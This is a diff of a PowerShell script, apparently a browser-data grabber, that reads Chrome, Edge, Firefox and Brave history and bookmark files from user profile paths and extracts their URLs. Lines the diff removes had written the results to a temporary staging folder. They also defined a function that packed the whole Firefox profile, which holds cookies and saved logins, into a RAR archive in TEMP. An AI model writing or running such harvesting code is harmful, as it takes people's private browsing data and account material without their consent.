@@ -486,7 +486,7 @@ function Get-BrowserData {
         [Parameter(Position=1, Mandatory = $True)]
         [string]$Browser,
         
-        [Parameter(Position=1, Mandatory = $True)]
+        [Parameter(Position=2, Mandatory = $True)]
         [string]$DataType 
     ) 
 
@@ -494,15 +494,25 @@ function Get-BrowserData {
 
     $Path = ""
 
-    if     ($Browser -eq 'chrome' -and $DataType -eq 'history')   { $Path = "$Env:USERPROFILE\AppData\Local\Google\Chrome\User Data\Default\History" }
-    elseif ($Browser -eq 'chrome' -and $DataType -eq 'bookmarks') { $Path = "$Env:USERPROFILE\AppData\Local\Google\Chrome\User Data\Default\Bookmarks" }
-    elseif ($Browser -eq 'edge' -and $DataType -eq 'history')     { $Path = "$Env:USERPROFILE\AppData\Local\Microsoft/Edge/User Data\Default\History" }
-    elseif ($Browser -eq 'edge' -and $DataType -eq 'bookmarks')   { $Path = "$env:USERPROFILE\AppData\Local\Mozilla\Firefox\Profiles\*.default-release-*\places.sqlite" }
-    elseif ($Browser -eq 'firefox' -and $DataType -eq 'history')  { $Path = "$Env:USERPROFILE\AppData\Roaming\Mozilla\Firefox\Profiles\*.default-release-*\places.sqlite" }
-    elseif ($Browser -eq 'firefox' -and $DataType -eq 'bookmarks'){ $Path = "$Env:USERPROFILE\AppData\Roaming\Mozilla\Firefox\Profiles\*.default-release-*\places.sqlite" }
-    elseif ($Browser -eq 'brave' -and $DataType -eq 'history')    { $Path = "C:\Users\$env:USERNAME\AppData\Local\BraveSoftware\Brave-Browser\User Data\Default\History" }
-    elseif ($Browser -eq 'brave' -and $DataType -eq 'bookmarks')  { $Path = "C:\Users\$env:USERNAME\AppData\Local\BraveSoftware\Brave-Browser\User Data\Default\Bookmarks" }
-    
+    if ($Browser -eq 'chrome' -and $DataType -eq 'history') {
+        $Path = "$Env:USERPROFILE\AppData\Local\Google\Chrome\User Data\Default\History"
+    }
+    elseif ($Browser -eq 'chrome' -and $DataType -eq 'bookmarks') {
+        $Path = "$Env:USERPROFILE\AppData\Local\Google\Chrome\User Data\Default\Bookmarks"
+    }
+    elseif ($Browser -eq 'edge' -and $DataType -eq 'history') {
+        $Path = "$Env:USERPROFILE\AppData\Local\Microsoft\Edge\User Data\Default\History"
+    }
+    elseif ($Browser -eq 'edge' -and $DataType -eq 'bookmarks') {
+        $Path = "$Env:USERPROFILE\AppData\Local\Microsoft\Edge\User Data\Default\Favorites"
+    }
+    elseif ($Browser -eq 'firefox' -and $DataType -eq 'history') {
+        $Path = "$Env:APPDATA\Mozilla\Firefox\Profiles\*.default-release-*\places.sqlite"
+    }
+    elseif ($Browser -eq 'firefox' -and $DataType -eq 'bookmarks') {
+        $Path = "$Env:APPDATA\Mozilla\Firefox\Profiles\*.default-release-*\bookmarks.html"
+    }
+
     if ($Path -ne "") {
         $Value = Get-Content -Path $Path | Select-String -AllMatches $regex | % {($_.Matches).Value} | Sort -Unique
         $Value | ForEach-Object {
@@ -519,28 +529,14 @@ function Get-BrowserData {
     }
 }
 
-# Função para compactar a pasta do perfil do Firefox em um arquivo .rar
-function Compress-FirefoxProfile {
-    $FirefoxProfileFolderPath = Get-ChildItem "$env:APPDATA\Mozilla\Firefox\Profiles\*.default-release-*" | Select-Object -First 1
-    if ($FirefoxProfileFolderPath) {
-        $FirefoxProfileFolderPath = $FirefoxProfileFolderPath.FullName
-        $OutputRarFilePath = Join-Path -Path $env:TEMP -ChildPath "Perfil_Firefox.rar"
-        & "C:\Program Files\WinRAR\WinRAR.exe" a -r $OutputRarFilePath $FirefoxProfileFolderPath
-        Write-Host "A pasta do perfil do Firefox foi comprimida em '$OutputRarFilePath'."
-    } else {
-        Write-Warning "A pasta do perfil do Firefox não foi encontrada."
-    }
-}
-
 # Extrair dados do histórico e favoritos dos navegadores
-Get-BrowserData -Browser "edge" -DataType "history" >> $env:TMP\$FolderName\BrowserData.txt
-Get-BrowserData -Browser "edge" -DataType "bookmarks" >> $env:TMP\$FolderName\BrowserData.txt
-Get-BrowserData -Browser "chrome" -DataType "history" >> $env:TMP\$FolderName\BrowserData.txt
-Get-BrowserData -Browser "chrome" -DataType "bookmarks" >> $env:TMP\$FolderName\BrowserData.txt
-Get-BrowserData -Browser "firefox" -DataType "history" >> $env:TMP\$FolderName\BrowserData.txt
-Get-BrowserData -Browser "firefox" -DataType "bookmarks" >> $env:TMP\$FolderName\BrowserData.txt
-Get-BrowserData -Browser "brave" -DataType "history" >> $env:TMP\$FolderName\BrowserData.txt
-Get-BrowserData -Browser "brave" -DataType "bookmarks" >> $env:TMP\$FolderName\BrowserData.txt
+Get-BrowserData -Browser "chrome" -DataType "history"
+Get-BrowserData -Browser "chrome" -DataType "bookmarks"
+Get-BrowserData -Browser "edge" -DataType "history"
+Get-BrowserData -Browser "edge" -DataType "bookmarks"
+Get-BrowserData -Browser "firefox" -DataType "history"
+Get-BrowserData -Browser "firefox" -DataType "bookmarks"
+
 
 ############################################################################################################################################################
 
